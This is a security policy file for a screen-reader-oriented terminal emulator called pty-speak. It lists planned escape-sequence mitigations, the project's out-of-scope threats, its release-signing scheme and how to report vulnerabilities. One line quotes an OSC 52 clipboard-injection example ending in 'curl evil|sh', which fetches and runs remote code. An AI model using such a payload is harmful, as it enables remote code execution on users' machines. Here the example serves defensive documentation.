# Security policy and trust model

> [!WARNING]
> **Releases tagged before `v0.1.0` are unsigned previews.** They
> carry no Authenticode signature and no Ed25519 release-manifest
> signature. SmartScreen will warn on first install. **Do not use
> preview builds in production or on machines that handle sensitive
> data.** Authenticode (via SignPath OSS) and Ed25519 manifest pinning
> return before `v0.1.0`; the procedure is preserved in
> [`docs/RELEASE-PROCESS.md`](docs/RELEASE-PROCESS.md) under
> "Re-enabling signing (deferred)".

`pty-speak` is a terminal emulator. That means it routinely renders
attacker-influenced bytes (build logs, `git log` output, `npm install`
output, model responses) and forwards user keystrokes to a child
process. The threat surface is real and historically rich.

This document explains:

1. What we defend against.
2. What is explicitly out of scope.
3. How releases are signed and verified.
4. How to report a vulnerability.

## What we defend against

The terminal core will implement the mandatory mitigations below. Each
bullet is annotated with its implementation status as of `main` at
Stage 3b — none of these protections are in code yet beyond the
`bInheritHandles = FALSE` guarantee that ConPTY itself enforces. The
list is the *target* trust model; track each via the corresponding
stage in [`spec/tech-plan.md`](spec/tech-plan.md).

- **No response-generating sequences.** *(planned, stage TBD as part of
  the Stage 2+ parser hardening pass.)* DSR (`CSI n`), DA1/DA2/DA3,
  DECRQM, DECRQSS, cursor-position report, title report (`CSI 21 t`),
  and font-size reports will be parsed and **dropped**. Background:
  CVE-2003-0063, CVE-2022-45872, CVE-2024-50349/52005.
- **No clipboard write from the child.** *(planned, parser-hardening
  pass.)* OSC 52 set-selection will be ignored. A child writing
  `\x1b]52;c;<base64 with newline>curl evil|sh\x07` must not be one
  paste away from RCE.
- **OSC 0/2 window title sanitisation.** *(planned, parser-hardening
  pass.)* Control characters and embedded escapes will be stripped
  before any UIA exposure or window title set; titles truncated to 256
  bytes. Background: CVE-2022-44702.
- **OSC 8 hyperlink scheme allowlist.** *(planned alongside the OSC 8
  UIA Hyperlink-pattern surface, Stage 4+.)* Only `http`, `https`, and
  `file` schemes will be exposed; `javascript:`, `data:`, custom URI
  schemes dropped silently.
- **Control-character stripping in `displayString`.** *(planned with
  Stage 5 streaming notifications.)* Everything passed to
  `UiaRaiseNotificationEvent` will have C0 / C1 / DEL stripped first.
- **Output rate limiting.** *(planned with Stage 5.)* Output ingestion
  capped at ~10 MB/s to defeat ANSI-bomb DoS targeting the screen
  reader rather than the CPU.
- **Process isolation.** *(partial, Stage 1.)* Pipe handles are not
  inherited (`bInheritHandles = FALSE`); ConPTY duplicates them via
  the attribute list — implemented today. **Job Object lifecycle
  (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) was deferred from Stage 1**;
  see [`docs/CONPTY-NOTES.md`](docs/CONPTY-NOTES.md). The "we never
  run elevated with an unelevated child" guarantee is also future
  work; until enforced in code, do not run pty-speak elevated.

The full mitigation matrix will live in `Terminal.Parser` and be
covered by parser-level unit tests. PRs that disable any of the above
must justify the change in the PR description and update this document.

## Out of scope

We do not defend against:

- A user pasting an arbitrary command and pressing Enter. Bracketed
  paste warns the child a paste is happening; it does not block it.
- A compromised developer machine with both the signing-key share and
  a checked-out clone. Our trust root is a private key; if it is
  stolen we revoke and reissue.
- Side-channel attacks on the host system.
- Vulnerabilities in third-party child processes (Claude Code, npm,
  pip, etc.). Once Job Object isolation lands we cap their lifetime
  to the parent's; we never audit their code.

## Release signing and verification

> The two layers below describe the **target** trust model from
> `v0.1.0` onward. Preview releases (`-preview.N`) are not yet signed;
> see the warning at the top of this document.

Every published `v0.1.0`+ release is signed in two layers:

1. **Authenticode** via the
   [SignPath Foundation OSS programme](https://signpath.org/) (free for
   active OSS projects). SmartScreen reputation accrues organically;
   per Microsoft's March 2024 changes, EV no longer grants instant
   reputation, so we treat the OSS-tier cert as sufficient.
2. **Ed25519 manifest pin.** The release manifest
   (`releases.json` produced by Velopack) is signed by an offline
   key. The application loads the public key from a code-frozen
   constant and rejects any update whose manifest signature does not
   verify, even if Authenticode passes. This is defense in depth
   against a compromised GitHub release without a stolen private key.

The public Ed25519 key is published as `docs/release-pubkey.txt` (it
will be added to the repository as part of the one-time release setup,
see [`docs/RELEASE-PROCESS.md`](docs/RELEASE-PROCESS.md)) and in the
release notes of every signed release. If the key needs to be rotated
we will issue an explicit out-of-band advisory.

To verify a release manually:

```powershell
# Authenticode
Get-AuthenticodeSignature .\pty-speak-Setup.exe |
  Select-Object Status, SignerCertificate

# Ed25519 manifest (once manifest tooling lands; see docs/RELEASE-PROCESS.md)
pty-speak-verify --manifest releases.json --pubkey docs/release-pubkey.txt
```

## Reporting a vulnerability

**Do not** open a public GitHub issue for an unpatched security bug.

Use [GitHub private vulnerability reporting](https://github.com/KyleKeane/pty-speak/security/advisories/new)
for this repository. We commit to:

- Acknowledge within **3 business days**.
- Provide a status update or fix plan within **10 business days**.
- Credit reporters in the release notes (or anonymously on request).

For matters that are too sensitive for GitHub (e.g. an issue with the
signing infrastructure itself), email the maintainer listed on the
GitHub profile of the repository owner.

## Coordinated disclosure

We follow a 90-day disclosure window from the date we acknowledge the
report, with extensions negotiated on a case-by-case basis. Public
advisories are filed as
[GitHub Security Advisories](../../security/advisories) and
cross-posted to the release notes.
